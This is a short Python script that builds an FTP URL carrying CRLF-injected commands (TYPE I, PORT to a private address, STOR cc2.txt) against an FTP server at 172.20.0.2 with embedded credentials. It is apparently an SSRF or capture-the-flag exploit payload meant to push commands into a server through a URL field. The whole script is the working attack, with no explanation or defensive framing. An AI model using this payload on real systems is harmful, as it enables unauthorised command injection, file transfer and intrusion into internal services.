import urllib.request

# Upload file
a = '''TYPE I
PORT 192,168,0,107,0,1889
STOR cc2.txt
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)